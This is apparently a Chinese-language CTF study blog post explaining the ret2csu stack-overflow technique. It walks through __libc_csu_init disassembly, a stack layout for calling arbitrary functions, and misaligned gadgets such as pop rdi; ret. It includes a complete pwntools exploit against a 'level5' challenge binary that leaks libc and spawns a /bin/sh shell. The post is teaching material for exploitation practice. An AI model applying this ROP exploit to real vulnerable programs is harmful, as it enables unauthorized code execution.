---
layout: post
title: ret2csu！
category: StackOverflow
date: 2023-9-20 12:00:00
---
ret2csu简单记录
<!-- more -->
# ret2csu

我们知道32位程序可以通过栈传递参数，但64位程序是用寄存器传递参数的，因此在`ret2libc`的时候需要有特定的`gadgets`来给寄存器赋值。有的情况下是没有这样的`gadgets`的，因此需要我们另辟蹊径，获得这样的`gadgets`。

在64位程序下，大多数程序都会调用`libc`的函数，而有一个特殊的函数用于对`libc`进行初始化操作，即`__libc_csu_init`函数。不同版本的函数有区别，我这里随便找了个程序来打开这个函数：

```assembly
.text:00000000004006D0 ; void _libc_csu_init(void)
.text:00000000004006D0                 public __libc_csu_init
.text:00000000004006D0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004006D0 ; __unwind {
.text:00000000004006D0                 push    r15
.text:00000000004006D2                 push    r14
.text:00000000004006D4                 mov     r15d, edi
.text:00000000004006D7                 push    r13
.text:00000000004006D9                 push    r12
.text:00000000004006DB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004006E2                 push    rbp
.text:00000000004006E3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004006EA                 push    rbx
.text:00000000004006EB                 mov     r14, rsi
.text:00000000004006EE                 mov     r13, rdx
.text:00000000004006F1                 sub     rbp, r12
.text:00000000004006F4                 sub     rsp, 8
.text:00000000004006F8                 sar     rbp, 3
.text:00000000004006FC                 call    _init_proc
.text:0000000000400701                 test    rbp, rbp
.text:0000000000400704                 jz      short loc_400726
.text:0000000000400706                 xor     ebx, ebx
.text:0000000000400708                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400710
.text:0000000000400710 loc_400710:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400710                 mov     rdx, r13
.text:0000000000400713                 mov     rsi, r14
.text:0000000000400716                 mov     edi, r15d
.text:0000000000400719                 call    qword ptr [r12+rbx*8]
.text:000000000040071D                 add     rbx, 1
.text:0000000000400721                 cmp     rbx, rbp
.text:0000000000400724                 jnz     short loc_400710
.text:0000000000400726
.text:0000000000400726 loc_400726:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400726                 add     rsp, 8
.text:000000000040072A                 pop     rbx
.text:000000000040072B                 pop     rbp
.text:000000000040072C                 pop     r12
.text:000000000040072E                 pop     r13
.text:0000000000400730                 pop     r14
.text:0000000000400732                 pop     r15
.text:0000000000400734                 retn
.text:0000000000400734 ; } // starts at 4006D0
.text:0000000000400734 __libc_csu_init endp
```

可以有以下点可以利用：

- `0x40072a` - `0x400732`

此处可以对`rbx`、`rbp`、`r12`、`r13`、`r14`、`r15`进行赋值并`ret`。为方便下面描述，这里称为过程1。

- `0x400710` - `0x400719`

此处有两个操作

一是使用`r13->rdx`，`r14->rsi`，`r15d->rdi`。 （给`edi`赋值时，`rdi`高位自动置零）

二是通过`r12 + rbx*8`实现任意函数调用。

这里称为过程2。

- `0x40071d` - `0x400724`

首先这里是过程2的后面。当`rbp = rbx + 1`时，函数继续执行到过程1。这里称为过程3。



从上面看出，我们可以通过以下流程来进行：

我们通过溢出到过程1，对寄存器进行赋值。由于最后有`ret`，继续执行栈上的内容。

栈上构造过程2。相当于过程1中，按照顺序是给寄存器`rbx`、`rbp`、`r12`、`rdx`、`rsi`、`edi`赋值。

那么设置`rbp = 1`，`rbx = 0`，满足过程3的条件，因此过程2执行完成后，会再次执行过程1（再次执行过程1只是为了接下来的`ret`，所以中间的部分直接填充了）。

过程2中执行任意函数地址为`r12`。这个函数的参数同样是最开始过程1中所控制的。



因此，我们可以设置如下栈：

high address     |  函数第一个参数 |  （只有低三十二位）

​                            |  函数第二个参数 |

​                            |  函数第三个参数 |

​                            |  要执行的函数的地址  |

​                            |  1  |

low address       |  0  |



在找到栈溢出点时，先溢出到过程1，过程1的栈如上所示，再溢出到过程2，即可通过上述栈完成任意函数执行。



来个`wiki`的`exp`：

```python
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```

## 改进

用此处的通用gadgets，输入的字节长度较长，有的情况下不允许有这样长的payload。因此：

- 改进1 提前控制`rbx`和`rbp`

可以看到`rbx`和`rbp`在里面唯一的作用就是用来满足继续执行的条件，因此`rbx=0`，`rbp=1`可以事先设置好

- 改进2 多次利用

顾名思义，将这里的通用`gadgets`分成多次使用（可以用分成的很直观的那两段）。但两次触发之间，要保证程序不会修改`r12-r15`寄存器，因为在两段之间需要用到。

其实长`payload`和多个`payload`还是要看程序的情况，只可以长`payload`但只能利用一次程序也不是不可能。



## 其他的可能可用的gadgets

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
// 这些函数也会默认被gcc编译，也可以尝试用其中的代码来执行。
```

以及：在`_libc_csu_init`里面其实可以有其他的利用方法。

我们看这一段：

```assembly
.text:000000000040072A                 pop     rbx
.text:000000000040072B                 pop     rbp
.text:000000000040072C                 pop     r12
.text:000000000040072E                 pop     r13
.text:0000000000400730                 pop     r14
.text:0000000000400732                 pop     r15
.text:0000000000400734                 retn
```

看似是这样，但是我们反编译一下：（`objdump -d`）（地址不一样，因为不是一个程序，下面用图里面的地址）

![image-20221210155950618](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211723005.png)

可以知道，其实`pop rbx`只是机器码（这个是机器码吗，不太懂，假如错了戳我一下）`5b`而已，同样的，`pop rbp`也就只是机器码`5d`，而像`pop r12`是两个数值，即`41 5c`。

我们着重看`pop r13`，机器码是`41 5d`，因为其中有一个关键的`5d`，我们知道`5d`其实就是`pop rbp`，而加上前面的`41`才组成了`pop r13`。我们看图里面的地址，`0x4006af`不就是`5d`嘛？所以，这里其实是可以拿到`pop rbp`的`gadgets`的。如图：

![image-20221210160528831](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211723968.png)

对应的，`pop r15`是`41 5f`，这里我们可以通过`0x4006b3`拿到`5f`，也就是`pop rdi`，组成了`pop rdi;ret`的`gadgets`。

总结一下，这里一共可以拿到的`gadgets`：

```assembly
; 从pop rbx开始偏移10个字节。
retn
-----------
; 从pop rbx开始偏移9个字节。
pop rdi
retn
-----------
; 从pop rbx开始偏移7个字节。
pop rsi
pop r15
retn
-----------
; 从pop rbx开始偏移5个字节。
pop rbp
pop r14
pop r15
retn
-----------
; 从pop rbx开始偏移3个字节。
pop rsp
pop r13
pop r14
pop r15
retn
```

